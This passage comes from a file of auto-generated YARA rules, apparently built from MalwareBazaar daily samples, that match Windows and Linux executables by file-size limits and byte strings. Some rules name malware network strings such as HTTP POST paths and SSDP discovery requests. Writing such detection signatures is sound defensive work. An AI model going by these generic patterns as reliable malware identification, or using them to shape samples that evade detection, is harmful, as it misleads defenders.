        description = "Auto ML: 3c816780d6733c7798f6348b2f3fa6be5bd0ac8413615280a5be3a89d8c64588"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Xe a&s&Y m"
        $s5 = "+ffe y"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 128KB
        and all of them
}

rule Windows_3ca4e6deae0fb30f79adab295116a91011ca88e3d75187f334a39a91e22254cf
{
    meta:
        description = "Auto ML: 3ca4e6deae0fb30f79adab295116a91011ca88e3d75187f334a39a91e22254cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Linux_3cc449cdf4c3807008de4d940bdc3b36b0da6dab93ce084e0aba2139609176c4
{
    meta:
        description = "Auto ML: 3cc449cdf4c3807008de4d940bdc3b36b0da6dab93ce084e0aba2139609176c4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4hKUUE"
        $s2 = ">J5yN*v"
        $s3 = "fyO7dZ"
        $s4 = "fZ\\zt,"
        $s5 = "~WW7xII"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB
        and all of them
}

rule Windows_3d106114b04dfc52f4f90ac77925e9ccb455b486ac7d7b3d8a53d29568dfdadd
{
    meta:
        description = "Auto ML: 3d106114b04dfc52f4f90ac77925e9ccb455b486ac7d7b3d8a53d29568dfdadd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4469KB
        and all of them
}

rule Windows_3d24879020f71f37768efb2dcd3724477b190b9f0c7f87c72edb472f81123ec5
{
    meta:
        description = "Auto ML: 3d24879020f71f37768efb2dcd3724477b190b9f0c7f87c72edb472f81123ec5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_048c51cddd7226942b94b0b406e6134fb17766eda673f1dd713fee7c845f4514
{
    meta:
        description = "Auto ML: 048c51cddd7226942b94b0b406e6134fb17766eda673f1dd713fee7c845f4514"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".sxdata"
        $s5 = "PSSSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7307KB
        and all of them
}

rule Linux_3d3fe37b91744a3e78a907a59dab89da5bd8f7706bcbcb0112e802f93ace8ad7
{
    meta:
        description = "Auto ML: 3d3fe37b91744a3e78a907a59dab89da5bd8f7706bcbcb0112e802f93ace8ad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4cfg"
        $s2 = "Pa(&Ra("
        $s3 = "ff4Jfg"
        $s4 = "http://"
        $s5 = "https://"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB
        and all of them
}

rule Windows_3d7066dda89f31d017e8d9cb6131f14f3aab9ec7cdb8d997a7d8198adf197180
{
    meta:
        description = "Auto ML: 3d7066dda89f31d017e8d9cb6131f14f3aab9ec7cdb8d997a7d8198adf197180"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "L&&jl66Z~??A"
        $s5 = ";d22Vt::N"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 410KB
        and all of them
}

rule Windows_3dc2dd6d83305e2fbacf5899758358aba943f5367d06606b6821978d17598b14
{
    meta:
        description = "Auto ML: 3dc2dd6d83305e2fbacf5899758358aba943f5367d06606b6821978d17598b14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS2N"
        $s4 = "mEe,}In"
        $s5 = "i;VbKq3X"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5207KB
        and all of them
}

rule Windows_3dc8f409caf68fa64a87698436f80ab9733c4842ed5f36ba3ada63f2e94057cf
{
    meta:
        description = "Auto ML: 3dc8f409caf68fa64a87698436f80ab9733c4842ed5f36ba3ada63f2e94057cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "9Fna~j"
        $s4 = "JpLa~j"
        $s5 = "tBpa~j"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1892KB
        and all of them
}

rule Windows_3dd8058844bb0d649563b7c8855924f6defa3fe47792b3597d11059c89d5596c
{
    meta:
        description = "Auto ML: 3dd8058844bb0d649563b7c8855924f6defa3fe47792b3597d11059c89d5596c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB
        and all of them
}

rule Windows_3de7b164aaa9e97535b26fb70bfc183d216cfaabee666744b4ac4f803acabd85
{
    meta:
        description = "Auto ML: 3de7b164aaa9e97535b26fb70bfc183d216cfaabee666744b4ac4f803acabd85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_3debd2ceefd8c64031ca66c3bc7165bfde2eee638c67a307642d7c6b8d9ce8ba
{
    meta:
        description = "Auto ML: 3debd2ceefd8c64031ca66c3bc7165bfde2eee638c67a307642d7c6b8d9ce8ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SSShL@A"
        $s5 = "qChDk@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB
        and all of them
}

rule Linux_3dedad438663c563520a8cbf25b8cc44a55eca3fde851774c8be98ac3a20b22e
{
    meta:
        description = "Auto ML: 3dedad438663c563520a8cbf25b8cc44a55eca3fde851774c8be98ac3a20b22e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Q3dse#f"
        $s2 = "#3a qR!a"
        $s3 = "b4r3a q"
        $s4 = "b4r3a,q"
        $s5 = "c4s2a1R"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 94KB
        and all of them
}

rule Windows_3df5b2d8fa12771d01180865d86b83385535794b18232cca17e5a7e3fac585fb
{
    meta:
        description = "Auto ML: 3df5b2d8fa12771d01180865d86b83385535794b18232cca17e5a7e3fac585fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "YZjX(\""
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 74KB
        and all of them
}

rule Windows_3e0159326f354109d2b468ead12982d5d33d6d5936081eb59903965b995bad22
{
    meta:
        description = "Auto ML: 3e0159326f354109d2b468ead12982d5d33d6d5936081eb59903965b995bad22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2287KB
        and all of them
}

rule Windows_052b4eda2c31d34095e1fc77adf582681b3659a77cfb5ed167af380d6f08d9db
{
    meta:
        description = "Auto ML: 052b4eda2c31d34095e1fc77adf582681b3659a77cfb5ed167af380d6f08d9db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 649KB
        and all of them
}

rule Windows_3e1aadef9e05b98e31fc7994dd3405a45da77fbb69632e31f7aa95d397201de0
{
    meta:
        description = "Auto ML: 3e1aadef9e05b98e31fc7994dd3405a45da77fbb69632e31f7aa95d397201de0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB
        and all of them
}

rule Linux_3e2203d5fb3ee68110288cc9affde04e44b619b27dbfa4a475d1535d30b0336e
{
    meta:
        description = "Auto ML: 3e2203d5fb3ee68110288cc9affde04e44b619b27dbfa4a475d1535d30b0336e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "f+p:YDh"
        $s3 = "S`@rrI"
        $s4 = "{<PA4`5A?C2D"
        $s5 = "VS3VS["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_3e37500863706fceb40ed46a56bf596e0159737679d8cdb62ddec4d4d8aa95df
{
    meta:
        description = "Auto ML: 3e37500863706fceb40ed46a56bf596e0159737679d8cdb62ddec4d4d8aa95df"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Unrotted"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB
        and all of them
}

rule Linux_3e6d80e3fc3ab60cca60c3199eb58f7d01ea062d49dce1de2c9790aa12ce494f
{
    meta:
        description = "Auto ML: 3e6d80e3fc3ab60cca60c3199eb58f7d01ea062d49dce1de2c9790aa12ce494f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB
        and all of them
}

rule Linux_3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067
{
    meta:
        description = "Auto ML: 3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "=)h-[0Hyk"
        $s2 = "mxILM*"
        $s3 = "1Uv\"UC"
        $s4 = "<t-FLi"
        $s5 = "8+uBOx&"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB
        and all of them
}

rule Windows_3e919e8f2497d8d0e45c1034090e736f3f4b70252ecf769f221e46525925e668
{
    meta:
        description = "Auto ML: 3e919e8f2497d8d0e45c1034090e736f3f4b70252ecf769f221e46525925e668"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "f rjeza~"
        $s4 = "X t.Cla~"
        $s5 = "|X X{TRa~"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3926KB
        and all of them
}

rule Windows_3ee2f01bd6dfc229152e748471f10c2228c715449e98f81ae7e91d065fdbda14
{
    meta:
        description = "Auto ML: 3ee2f01bd6dfc229152e748471f10c2228c715449e98f81ae7e91d065fdbda14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "kh['/yS?"
        $s3 = "pq_lw=~AC`"
        $s4 = "D)aI,I"
        $s5 = "#Ai}?hwv)"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_3f28e0e5dcc6d17342acd26d9091a08e2d85b6183cd0c2e5b20ac5e33d2f2491
{
    meta:
        description = "Auto ML: 3f28e0e5dcc6d17342acd26d9091a08e2d85b6183cd0c2e5b20ac5e33d2f2491"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3175KB
        and all of them
}

rule Windows_3f4ba7b687f2001336bbcfb00e5ad83ebc64de5d9adca2ec42fa21d5973562f5
{
    meta:
        description = "Auto ML: 3f4ba7b687f2001336bbcfb00e5ad83ebc64de5d9adca2ec42fa21d5973562f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6255KB
        and all of them
}

rule Windows_3f5b8f29418ec144bf5c5c598b32ca2b28c5a650380377552c5797f975f750e3
{
    meta:
        description = "Auto ML: 3f5b8f29418ec144bf5c5c598b32ca2b28c5a650380377552c5797f975f750e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "OLEAUT32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.DLL"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1566KB
        and all of them
}

rule Windows_05386f3b8d8c87bf3609a65d5306483f65529ed355aedc2c62d52847dd12ec6e
{
    meta:
        description = "Auto ML: 05386f3b8d8c87bf3609a65d5306483f65529ed355aedc2c62d52847dd12ec6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "@.eh_fram"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17549KB
        and all of them
}

rule Windows_3f5f2f927de6764d2adf26845d8385070c39d25637bba59b0193e9d4a74e3cd4
{
    meta:
        description = "Auto ML: 3f5f2f927de6764d2adf26845d8385070c39d25637bba59b0193e9d4a74e3cd4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "whxfA#"
        $s3 = "PQ2gaa"
        $s4 = "UVATt8"
        $s5 = "MT|um6k"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1200KB
        and all of them
}

rule Windows_3f72928d0f49086a7a5f96d15e5e3eb0dac7a7927da3717bc6d90d576877c88e
{
    meta:
        description = "Auto ML: 3f72928d0f49086a7a5f96d15e5e3eb0dac7a7927da3717bc6d90d576877c88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<datetimeMenu_SelectedIndexChanged>b__13_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 939KB
        and all of them
}

rule Windows_3fbf742d2ceab5970c771a4543e88de717140976fbf857b900b01884d55ae872
{
    meta:
        description = "Auto ML: 3fbf742d2ceab5970c771a4543e88de717140976fbf857b900b01884d55ae872"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1226KB
        and all of them
}

rule Windows_3fefd283343b7f7c7f4b41c4b1cd4d396db892a5866361722d22b28a632a95bb
{
    meta:
        description = "Auto ML: 3fefd283343b7f7c7f4b41c4b1cd4d396db892a5866361722d22b28a632a95bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.managed"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5320KB
        and all of them
}

rule Windows_3ff25536a0efe6eb1f6de670d7d160733e6c3999c51a8673bc22c26ba30ede49
{
    meta:
        description = "Auto ML: 3ff25536a0efe6eb1f6de670d7d160733e6c3999c51a8673bc22c26ba30ede49"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3162KB
        and all of them
}

rule Windows_3ffabf91b3bcdc13d8ea54822e00ba760d783bda55893b29e255abf119865305
{
    meta:
        description = "Auto ML: 3ffabf91b3bcdc13d8ea54822e00ba760d783bda55893b29e255abf119865305"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "iRichu"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".ndata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 253KB
        and all of them
}

rule Windows_404afd3c18b203aa9ce9f8f5f9b7a813fda0d2a322252cd28e002e142080a4f7
{
    meta:
        description = "Auto ML: 404afd3c18b203aa9ce9f8f5f9b7a813fda0d2a322252cd28e002e142080a4f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXh`?B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB
        and all of them
}

rule Windows_4098768512e0290686ce227b5f60f597b47467cc5dff2f06651d4a7c0a80caa2
{
    meta:
        description = "Auto ML: 4098768512e0290686ce227b5f60f597b47467cc5dff2f06651d4a7c0a80caa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "%N\"UUU@XV"
        $s5 = "c UUUUj_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5667KB
        and all of them
}

rule Windows_40e261e7bffce05b06dc3d6feaa430d310ec8bde473e1136255965b8aa28f925
{
    meta:
        description = "Auto ML: 40e261e7bffce05b06dc3d6feaa430d310ec8bde473e1136255965b8aa28f925"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "wQQ}$QQ}$QQ}$gwv$XQ}$"
        $s3 = "Ms$GQ}$gww$mQ}$"
        $s4 = "^ $RQ}$QQ|$"
        $s5 = "Nv$SQ}$"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1213KB
        and all of them
}

rule Linux_414ec49b347b21c68cb49cb6950047000e988e2a6bd1cee4d8a4568c10fe778d
{
    meta:
        description = "Auto ML: 414ec49b347b21c68cb49cb6950047000e988e2a6bd1cee4d8a4568c10fe778d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "7%#FJOJ"
        $s2 = "va!Prg"
        $s3 = "Hwg<|in"
        $s4 = "T=1zRO"
        $s5 = "J)<^kr-R"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1159KB
        and all of them
}

rule Linux_053fd0e6c798ff6ad4869b706f55c109df888cebd996ededdc8910a612506bd5
{
    meta:
        description = "Auto ML: 053fd0e6c798ff6ad4869b706f55c109df888cebd996ededdc8910a612506bd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB
        and all of them
}

rule Windows_41971da9cb866aa19e6d70d62287f622bb79d9cbbee1a8a29c44ecc3b066afc6
{
    meta:
        description = "Auto ML: 41971da9cb866aa19e6d70d62287f622bb79d9cbbee1a8a29c44ecc3b066afc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "L)ga~b"
        $s4 = "SZTa~b"
        $s5 = "jZxa~b"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1605KB
        and all of them
}

rule Windows_41dbdaeb1dc8fe40358a5e168af596da85c6a84796e63c9d10c11f2077129eaf
{
    meta:
        description = "Auto ML: 41dbdaeb1dc8fe40358a5e168af596da85c6a84796e63c9d10c11f2077129eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "A1GIA+"
        $s3 = "A1GyA8"
        $s4 = "A1GJA+"
        $s5 = "ARich*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 56KB
        and all of them
}

rule Windows_42de7a49058e8d6f5d75496d3d162e3a50aa6a6f5b153cdf5e22c39f125c363c
{
    meta:
        description = "Auto ML: 42de7a49058e8d6f5d75496d3d162e3a50aa6a6f5b153cdf5e22c39f125c363c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "QQSVWd"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 246KB
        and all of them
}

rule Windows_4315c14af0772f50b9b383cae378f26e71e77156886209344791c7f931d6425c
{
    meta:
        description = "Auto ML: 4315c14af0772f50b9b383cae378f26e71e77156886209344791c7f931d6425c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "tTSWSj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1069KB
        and all of them
}

rule Windows_431fd29552ea2ff3ade5f1c8c2c4e0b3d0eda33164a4487c4bc9174bc6bd4a44
{
    meta:
        description = "Auto ML: 431fd29552ea2ff3ade5f1c8c2c4e0b3d0eda33164a4487c4bc9174bc6bd4a44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 151KB
        and all of them
}

rule Windows_435a12ab59bb78ad797f1f9b4b2fad50799bc217e93669bf543540b358a5dcdc
{
    meta:
        description = "Auto ML: 435a12ab59bb78ad797f1f9b4b2fad50799bc217e93669bf543540b358a5dcdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "t$$VQP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1059KB
        and all of them
}

rule Windows_43bdfc9704b3cf395af87f2bee4d8e06ba314e99a545b32a5416249744dc6961
{
    meta:
        description = "Auto ML: 43bdfc9704b3cf395af87f2bee4d8e06ba314e99a545b32a5416249744dc6961"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB
        and all of them
}

rule Windows_43d0cd2a2ebaf029a98545e0cd3b0013ae7564fe9e0e19b378e67c8b0737d29e
{
    meta:
        description = "Auto ML: 43d0cd2a2ebaf029a98545e0cd3b0013ae7564fe9e0e19b378e67c8b0737d29e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "K/f@KP"
        $s4 = "CkE$e:"
        $s5 = "mw]c]_t"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6127KB
        and all of them
}

rule Windows_440735ee865d661efeef4060d676239d02cf3e8d9f47a95f48358d7e19bc08a5
{
    meta:
        description = "Auto ML: 440735ee865d661efeef4060d676239d02cf3e8d9f47a95f48358d7e19bc08a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "h.vmp1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11358KB
        and all of them
}

rule Windows_441cc4670d7c22a5b25f09d098e3d47022447e43f020b24f31e1d6ffc525a43f
{
    meta:
        description = "Auto ML: 441cc4670d7c22a5b25f09d098e3d47022447e43f020b24f31e1d6ffc525a43f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<NodesControl_MouseClick>b__47_10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 668KB
        and all of them
}

rule Windows_0575c960e8384fa8581549a2ec59fe1a722f1954a2280319807216a2ca247453
{
    meta:
        description = "Auto ML: 0575c960e8384fa8581549a2ec59fe1a722f1954a2280319807216a2ca247453"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
